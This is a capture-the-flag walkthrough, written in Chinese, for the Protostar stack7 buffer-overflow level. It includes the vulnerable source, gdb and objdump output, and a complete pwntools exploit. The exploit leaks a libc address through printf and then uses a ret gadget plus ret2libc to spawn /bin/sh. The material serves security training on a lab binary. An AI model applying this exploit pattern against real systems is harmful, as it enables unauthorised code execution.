```
# Stack Seven

Stack6 introduces return to .text to gain code execution.

The metasploit tool “msfelfscan” can make searching for suitable instructions very easy, otherwise looking through objdump output will suffice.

This level is at /opt/protostar/bin/stack7
```
### Source code

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

char *getpath()
{
  char buffer[64];
  unsigned int ret;

  printf("input path please: "); fflush(stdout);

  gets(buffer);

  ret = __builtin_return_address(0);

  if((ret & 0xb0000000) == 0xb0000000) {
      printf("bzzzt (%p)\n", ret);
      _exit(1);
  }

  printf("got path %s\n", buffer);
  return strdup(buffer);
}

int main(int argc, char **argv)
{
  getpath();
}
```
---

```c
└─$ objdump -t -j .text stack7           

stack7:     file format elf32-i386

SYMBOL TABLE:
08048410 l    d  .text  00000000              .text
08048440 l     F .text  00000000              __do_global_dtors_aux
080484a0 l     F .text  00000000              frame_dummy
080485d0 l     F .text  00000000              __do_global_ctors_aux
08048560 g     F .text  00000005              __libc_csu_fini
08048410 g     F .text  00000000              _start
08048570 g     F .text  0000005a              __libc_csu_init
080484c4 g     F .text  00000081              getpath
080485ca g     F .text  00000000              .hidden __i686.get_pc_thunk.bx
08048545 g     F .text  0000000f              main

```

**计算偏移量*(可以看到偏移量为80)*
```C
└─$ gdb-peda
Successfully imported six module
gdb-peda$ file stack7
Reading symbols from stack7...
gdb-peda$ b main
Breakpoint 1 at 0x804854b: file stack7/stack7.c, line 28.
gdb-peda$ pattern_create 200
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'
gdb-peda$ run
Starting program: /opt/protostar/bin/stack7 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Warning: 'set logging off', an alias for the command 'set logging enabled', is deprecated.
Use 'set logging enabled off'.

Warning: 'set logging on', an alias for the command 'set logging enabled', is deprecated.
Use 'set logging enabled on'.

[----------------------------------registers-----------------------------------]
EAX: 0x8048545 (<main>: push   ebp)
EBX: 0xf7f95e14 --> 0x232d0c ('\x0c-#')
ECX: 0x1dedde51 
EDX: 0xffffcec0 --> 0xf7f95e14 --> 0x232d0c ('\x0c-#')
ESI: 0x8048570 (<__libc_csu_init>:      push   ebp)
EDI: 0xf7ffcb60 --> 0x0 
EBP: 0xffffce98 --> 0x0 
ESP: 0xffffce90 --> 0x0 
EIP: 0x804854b (<main+6>:       call   0x80484c4 <getpath>)
EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8048545 <main>:    push   ebp
   0x8048546 <main+1>:  mov    ebp,esp
   0x8048548 <main+3>:  and    esp,0xfffffff0
=> 0x804854b <main+6>:  call   0x80484c4 <getpath>
   0x8048550 <main+11>: mov    esp,ebp
   0x8048552 <main+13>: pop    ebp
   0x8048553 <main+14>: ret
   0x8048554:   nop
Guessed arguments:
arg[0]: 0x0 
[------------------------------------stack-------------------------------------]
0000| 0xffffce90 --> 0x0 
0004| 0xffffce94 --> 0x0 
0008| 0xffffce98 --> 0x0 
0012| 0xffffce9c --> 0xf7d87cc3 (<__libc_start_call_main+115>:  add    esp,0x10)
0016| 0xffffcea0 --> 0x1 
0020| 0xffffcea4 --> 0xffffcf54 --> 0xffffd147 ("/opt/protostar/bin/stack7")
0024| 0xffffcea8 --> 0xffffcf5c --> 0xffffd161 ("LESS_TERMCAP_se=\033[0m")
0028| 0xffffceac --> 0xffffcec0 --> 0xf7f95e14 --> 0x232d0c ('\x0c-#')
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, main (argc=0x1, argv=0xffffcf54) at stack7/stack7.c:28
warning: 28     stack7/stack7.c: No such file or directory
gdb-peda$ n
input path please: AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA
got path AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAJAAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x804a9c0 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAJAAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
EBX: 0xf7f95e14 --> 0x232d0c ('\x0c-#')
ECX: 0x0 
EDX: 0x804aa89 --> 0x79000000 ('')
ESI: 0x8048570 (<__libc_csu_init>:      push   ebp)
EDI: 0xf7ffcb60 --> 0x0 
EBP: 0x41344141 ('AA4A')
ESP: 0xffffce90 ("fAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
EIP: 0x41414a41 ('AJAA')
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41414a41
[------------------------------------stack-------------------------------------]
0000| 0xffffce90 ("fAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0004| 0xffffce94 ("AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0008| 0xffffce98 ("AgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0012| 0xffffce9c ("6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0016| 0xffffcea0 ("AAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0020| 0xffffcea4 ("A7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0024| 0xffffcea8 ("MAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0028| 0xffffceac ("AA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41414a41 in ?? ()
gdb-peda$ pattern_offset 0x41414a41
1094797889 found at offset: 80
```

**泄漏libc函数地址（选择泄漏gets函数的地址）**

```c
└─$ objdump -R stack7

stack7:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
08049738 R_386_GLOB_DAT    __gmon_start__
08049780 R_386_COPY        stdout@GLIBC_2.0
08049748 R_386_JUMP_SLOT   __gmon_start__
0804974c R_386_JUMP_SLOT   gets@GLIBC_2.0
08049750 R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.0
08049754 R_386_JUMP_SLOT   _exit@GLIBC_2.0
08049758 R_386_JUMP_SLOT   fflush@GLIBC_2.0
0804975c R_386_JUMP_SLOT   printf@GLIBC_2.0
08049760 R_386_JUMP_SLOT   strdup@GLIBC_2.0
```

```c
└─$ objdump -d stack7 | grep "printf@plt"
080483e4 <printf@plt>:
 80484d2:       e8 0d ff ff ff          call   80483e4 <printf@plt>
 8048513:       e8 cc fe ff ff          call   80483e4 <printf@plt>
 8048533:       e8 ac fe ff ff          call   80483e4 <printf@plt>
```

```c
└─$ objdump -s -j .rodata stack7


stack7:     file format elf32-i386

Contents of section .rodata:
 8048618 03000000 01000200 696e7075 74207061  ........input pa
 8048628 74682070 6c656173 653a2000 627a7a7a  th please: .bzzz
 8048638 74202825 70290a00 676f7420 70617468  t (%p)..got path
 8048648 2025730a 00                           %s..   
```

```c
地址信息如下：
gets@GOT = 0804974c
printf@plt = 080483e4
"%s" = 8048648
main_addr = 08048545
```

##### 栈布局如下：
```
+------------------+
|   缓冲区填充     | 80 bytes
+------------------+
|   printf@plt     | 覆盖返回地址
+------------------+
|   main 地址      | printf 的返回地址
+------------------+
|   格式字符串地址 | printf 的第一个参数
+------------------+
|   gets GOT 地址  | printf 的第二个参数
+------------------+
```

**泄漏地址的代码如下：**

```python
from pwn import *

context(arch='i386', os='linux')

p = process('/opt/protostar/bin/stack7')

offset = 80
printf_plt = 0x080483e4
main_addr = 0x08048545
gets_got = 0x0804974c

# 第一步：泄露 gets 地址
payload = b'A' * offset
payload += p32(printf_plt)      # 返回到 printf
payload += p32(main_addr)        # printf 返回后回到 main
payload += p32(0x08048648)       # 格式字符串 " %s\n"
payload += p32(gets_got)         # 要泄露的 GOT 地址

print("[*] Sending leak payload...")
p.sendline(payload)

# 接收第一次的输出
p.recvuntil(b"got path ")
p.recvline()  # 接收包含很多 A 的那一行

p.recv(1)  # 接收空格
leaked_gets = u32(p.recv(4))
print(f"[+] Leaked gets address: {hex(leaked_gets)}")

'''
示例输出如下：
└─$ python addr.py
[+] Starting local process '/opt/protostar/bin/stack7': pid 23206
[*] Sending leak payload...
[+] Leaked gets address: 0xf7cf9670
[*] Stopped process '/opt/protostar/bin/stack7' (pid 23206)
'''
```

**获取libc函数偏移地址**

```c
常用两种方式：


└─$ ldd stack7
        linux-gate.so.1 (0xf7ee8000)
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7c86000)
        /lib/ld-linux.so.2 (0xf7eea000)


1、readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep gets

2、objdump -T /lib/x86_64-linux-gnu/libc.so.6 | grep gets
```

**继续计算libc基地址**

```c
libc_base = leaked_gets - gets_offset
system_addr = libc_base + system_offset
binsh_addr = libc_base + binsh_offset
```

**由于stack7中检查ret返回地址的范围是0xb0000000，比stack6中0xbf000000覆盖面更大**
**所以直接将返回地址覆盖为system的地址，就会导致返回地址检查被触发，输出bzzzt并退出**

**所以不可以直接将返回地址覆盖为system地址，而是先覆盖为.text段（不会触发检查）的一个ret地址，再跳转到system**
**其栈布局如下：**

```c
+------------------+
|   缓冲区填充     | 80 bytes ('A'*80)
+------------------+
|   ret gadget     | 覆盖的返回地址 (0x08048553)
+------------------+
|   system 地址    | ret gadget 执行后的返回地址
+------------------+
|   虚假返回地址   | system 的返回地址 (0x41414141)
+------------------+
|   /bin/sh 地址   | system 的第一个参数
+------------------+
```

**下面是完整的exp:**


```python
from pwn import *

context(arch='i386', os='linux')

p = process('/opt/protostar/bin/stack7')

offset = 80
printf_plt = 0x080483e4
main_addr = 0x08048545
gets_got = 0x0804974c

# 第一步：泄露 gets 地址
payload = b'A' * offset
payload += p32(printf_plt)      # 返回到 printf
payload += p32(main_addr)        # printf 返回后回到 main
payload += p32(0x08048648)       # 格式字符串 " %s\n"
payload += p32(gets_got)         # 要泄露的 GOT 地址

print("[*] Sending leak payload...")
p.sendline(payload)

# 接收输出
p.recvuntil(b"got path ")
p.recvline()  # 接收包含 A 的那一行

p.recv(1)  # 接收空格
leaked_gets = u32(p.recv(4))
print(f"[+] Leaked gets address: {hex(leaked_gets)}")

# 等待下一个输入提示
p.recvuntil(b"input path please: ")

# 第二步：计算地址
libc = ELF('/lib/i386-linux-gnu/libc.so.6')
gets_offset = libc.symbols['gets']
system_offset = libc.symbols['system']
binsh_offset = next(libc.search(b'/bin/sh'))

libc_base = leaked_gets - gets_offset
system_addr = libc_base + system_offset
binsh_addr = libc_base + binsh_offset

print(f"[+] Libc base: {hex(libc_base)}")
print(f"[+] System address: {hex(system_addr)}")
print(f"[+] /bin/sh address: {hex(binsh_addr)}")

# 找到二进制文件中的 ret gadget
# 可以用这个命令查找：objdump -d stack7 | grep -A1 "ret"
ret_gadget = 0x08048553  # 这是 main 函数中的 ret 指令

# 第三步：使用 ret gadget 进行 ret2libc
payload2 = b'A' * offset
payload2 += p32(ret_gadget)      # 先返回到 ret gadget
payload2 += p32(system_addr)     # 然后到 system
payload2 += p32(0x41414141)      # system 的假返回地址
payload2 += p32(binsh_addr)      # system 的参数

print("[*] Sending ret2libc payload...")
p.sendline(payload2)

# 获取 shell
p.interactive()
```

![image.png](https://raw.gitmirror.com/DarkLord-W/CloudImages/main/images/20250903102336550.png)


